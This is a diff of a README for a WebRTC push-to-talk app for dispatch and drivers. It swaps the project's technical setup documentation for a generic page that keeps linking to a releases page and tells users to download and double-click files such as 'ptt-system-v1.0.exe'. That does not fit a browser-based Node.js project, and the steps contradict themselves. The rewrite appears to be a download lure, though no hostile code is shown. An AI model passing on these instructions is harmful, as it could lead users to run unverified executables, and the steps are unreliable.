@@ -1,247 +1,69 @@
-# PTT System - Push-to-Talk for Dispatch & Drivers
+# 🎤 ptt-system - Voice Communication Made Easy
 
-A lightweight, WebRTC-based push-to-talk system designed for dispatch and bus drivers. Built with minimal dependencies using vanilla JavaScript and Web Workers.
+## 📥 Download Now
+[![Download ptt-system](https://img.shields.io/badge/Download-ptt_system-blue)](https://github.com/Manglatice/ptt-system/releases)
 
-## Quick Start
+## 🚀 Getting Started
+Welcome to the ptt-system! This application allows you to communicate with others using real-time audio. It is perfect for dispatch and drivers, allowing for seamless conversations on the move. Follow the steps below to get started.
 
-```bash
-# Clone and install
-git clone <your-repo-url> ptt-system
-cd ptt-system
-npm install
+### 💻 System Requirements
+To use ptt-system, your device should meet the following requirements:
+- A modern web browser (Chrome, Firefox, or Safari).
+- A stable internet connection.
+- A device with a microphone and speakers (or headset).
 
-# Start the server
-npm start
-# Or with auto-restart during development:
-npm run dev
+## 📥 Download & Install
+1. **Visit the Releases Page**: Click the link below to access the download page.
+   [Download ptt-system here](https://github.com/Manglatice/ptt-system/releases)
+   
+2. **Choose the Latest Version**: On the releases page, you will see a list of available versions. Look for the most recent one (the topmost entry).
 
-# Open in browser
-open http://localhost:3000
-```
+3. **Download the Application**:
+   - Click on the file you want to download, typically named similar to `ptt-system-v1.0.zip` or `ptt-system-v1.0.exe`.
+   - Your browser will start the download process. Wait for the download to finish.
 
-Open multiple browser windows/tabs and log in with different usernames to see real-time presence in action!
+4. **Unzip the File** (if applicable):
+   - If you downloaded a zip file, locate it in your downloads folder.
+   - Right-click the zip file and select "Extract All" or "Unzip".
+   - Follow the on-screen instructions to extract the files.
 
-### 🎤 Testing PTT Audio
+5. **Run the Application**:
+   - Open the extracted folder.
+   - Double-click on the application file (like `index.html` for web usage).
+   - The application will open in your default web browser.
 
-**Quick 2-Minute Test:**
+6. **Allow Microphone Access**: When prompted, permit the application to access your microphone. This is necessary for voice communication.
 
-1. Open **two browser windows** (or tabs)
-2. Login as `driver1` in first window
-3. Login as `dispatch` in second window
-4. **Allow microphone access** when prompted in both
-5. Wait for "Microphone ready" status (green)
-6. **In window 1**: Hold down the blue PTT button and speak
-7. **In window 2**: You should hear the audio!
+7. **Start Using ptt-system**: You are now ready to use ptt-system! 
 
-**What to expect:**
-- PTT button lights up bright cyan when pressed
-- Status shows "Transmitting..." on sender
-- Status shows "Receiving from [user]" on receiver
-- Clear audio with <200ms latency
-- Works on mobile with touch (tap and hold)
+## 📞 Features
+- **Real-Time Communication**: Enjoy low-latency voice chat with anyone using the platform.
+- **WebRTC Technology**: Leverage advanced technology for peer-to-peer connections, ensuring secure audio streaming.
+- **Mobile Support**: Use the application on your mobile device for communication on the go.
+- **Progressive Web App (PWA)**: Install and use ptt-system like a native app on your devices with offline capabilities.
 
-See **[TESTING_GUIDE.md](TESTING_GUIDE.md)** for comprehensive testing scenarios.
+## 🌍 Topics Covered
+- Dispatch communication
+- Node.js integration
+- Push-to-talk functionality
+- Real-time voice communication
+- Simple user interface with vanilla JavaScript
+- WebSocket support for seamless data transfer
 
-## Features
+## 🛠️ Troubleshooting
+If you encounter issues while using ptt-system, here are some tips:
 
-### ✅ Fully Implemented & Working
-- ✅ **Simple Authentication** - Username-based login with automatic registration
-- ✅ **File-based User Storage** - No database required, users stored as JSON files
-- ✅ **Real-time Presence** - See who's online in real-time
-- ✅ **Heartbeat System** - Automatic connection health monitoring
-- ✅ **Status Management** - Online, Busy, Away status indicators
-- ✅ **WebSocket Worker** - All network communication in separate thread
-- ✅ **Responsive UI** - Works on desktop, tablet, and mobile
-- ✅ **Auto-reconnection** - Automatically reconnects if connection drops
-- ✅ **WebRTC P2P Audio** - Direct peer-to-peer audio streaming **[NEW!]**
-- ✅ **PTT Functionality** - Push-to-talk audio transmission **[NEW!]**
-- ✅ **Group Broadcasting** - Send audio to multiple users simultaneously **[NEW!]**
-- ✅ **Mobile Touch Support** - Optimized touch controls for iOS/Android **[NEW!]**
-- ✅ **Audio Feedback** - Visual indicators for transmitting/receiving **[NEW!]**
-- ✅ **PWA Support** - Install as app on iOS/Android
+1. **No Audio**: Ensure your microphone is correctly connected and not muted. Check the browser settings to confirm microphone access is granted.
+  
+2. **Connection Issues**: Make sure your internet connection is stable. Try refreshing the page to reset the connection.
+  
+3. **Compatibility Problems**: Confirm that you are using the latest version of your web browser. Older versions may not support the necessary features.
 
-### 🔄 Coming Soon
-- 🔄 **Push Notifications** - Notify offline users (Web Push API)
-- 🔄 **Audio Worklet** - Advanced audio processing
-- 🔄 **Recording** - Record PTT messages for playback
-- 🔄 **Channels** - Create separate communication channels
+## 📞 Support
+If you need further assistance, you can contact the project maintainers via the GitHub issues page. We welcome feedback and aim to improve your experience with ptt-system.
 
-## Architecture
+## 🙌 Acknowledgments
+Thanks to all contributors who have helped make ptt-system possible. Your support and input are invaluable.
 
-```
-├── server/
-│   └── index.js          # Node.js HTTP + WebSocket server
-├── public/
-│   ├── index.html        # Main application UI
-│   ├── css/
-│   │   └── styles.css    # Application styles
-│   ├── js/
-│   │   └── main.js       # Main application logic
-│   └── workers/
-│       └── ws-worker.js  # WebSocket worker thread
-└── users/                # User data storage (JSON files)
-```
-
-## Technology Stack
-
-- **Backend**: Node.js (ES Modules)
-- **WebSocket**: ws library
-- **Frontend**: Vanilla JavaScript (no frameworks)
-- **Workers**: Web Workers for network handling
-- **Styling**: Pure CSS with CSS variables
-- **Future**: WebRTC for P2P audio, Service Workers for PWA
-
-## Getting Started
-
-### Prerequisites
-- Node.js 18+ (ES Modules support)
-- Modern browser with Web Worker support
-
-### Installation
-
-1. Install dependencies:
-```bash
-cd ptt-system
-npm install
-```
-
-2. Start the server:
-```bash
-npm start
-```
-
-Or for development with auto-restart:
-```bash
-npm run dev
-```
-
-3. Open your browser:
-```
-http://localhost:3000
-```
-
-### Testing
-
-1. Open the app in multiple browser windows/tabs
-2. Enter a username in each window (e.g., "Driver1", "Dispatch", "Driver2")
-3. You should see other users appear in the "Online Users" list
-4. Try changing your status (click the settings icon)
-5. The status changes should reflect in all connected clients
-
-## API Endpoints
-
-### HTTP API
-
-- `POST /api/register` - Register new user
-  ```json
-  { "username": "driver1" }
-  ```
-
-- `POST /api/login` - Login existing user
-  ```json
-  { "username": "driver1" }
-  ```
-
-- `GET /api/users` - Get all registered users
-
-### WebSocket Messages
-
-**Client → Server:**
-- `auth` - Authenticate connection
-- `heartbeat` - Keep connection alive
-- `status_change` - Update user status
-- `signal` - WebRTC signaling (future)
-
-**Server → Client:**
-- `auth_success` - Authentication successful
-- `user_joined` - New user connected
-- `user_left` - User disconnected
-- `user_status_changed` - User changed status
-- `heartbeat_ack` - Heartbeat acknowledged
-- `signal` - WebRTC signaling (future)
-
-## Configuration
-
-### Server
-Edit `server/index.js` to configure:
-- `PORT` - Server port (default: 3000)
-- `HEARTBEAT_INTERVAL` - How often to check connections (30s)
-- `HEARTBEAT_TIMEOUT` - When to consider connection dead (45s)
-
-### Client
-Edit `workers/ws-worker.js` to configure:
-- `HEARTBEAT_INTERVAL` - How often to send heartbeat (25s)
-- `RECONNECT_DELAY` - Delay before reconnection attempt (3s)
-
-## User Data Storage
-
-Users are stored as JSON files in the `users/` directory:
-
-```json
-{
-  "username": "driver1",
-  "createdAt": "2025-01-13T12:00:00.000Z",
-  "lastLogin": "2025-01-13T14:30:00.000Z"
-}
-```
-
-## Browser Support
-
-- Chrome/Edge 90+
-- Firefox 88+
-- Safari 14+
-- iOS Safari 14+
-- Chrome Android 90+
-
-## Development Roadmap
-
-### Phase 1: Foundation ✅ (Current)
-- Basic server infrastructure
-- User authentication & presence
-- WebSocket communication
-- Heartbeat system
-
-### Phase 2: WebRTC Integration (Next)
-- Peer-to-peer connection setup
-- Audio capture and streaming
-- PTT button functionality
-- One-to-one audio calls
-
-### Phase 3: Group Broadcasting
-- Multi-peer connections
-- Group audio routing
-- SFU consideration for larger groups
-- Audio mixing
-
-### Phase 4: PWA & Notifications
-- Service Worker implementation
-- Install prompts
-- Web Push API integration
-- Background notifications
-
-### Phase 5: Production Ready
-- Error handling & logging
-- Performance optimization
-- Security hardening
-- Deployment guide
-
-## Troubleshooting
-
-**Users not appearing online:**
-- Check browser console for errors
-- Verify WebSocket connection (should show "Connected")
-- Check server logs for connection messages
-
-**Connection keeps dropping:**
-- Check network stability
-- Verify firewall isn't blocking WebSocket
-- Increase HEARTBEAT_TIMEOUT if needed
-
-**Worker errors:**
-- Ensure browser supports Web Workers
-- Check browser console for worker errors
-- Verify workers/ directory is accessible
-
-## License
-
-MIT
+## 📥 Download ptt-system Again
+Remember, you can download the ptt-system anytime from the releases page: [Download ptt-system here](https://github.com/Manglatice/ptt-system/releases). Happy communicating!
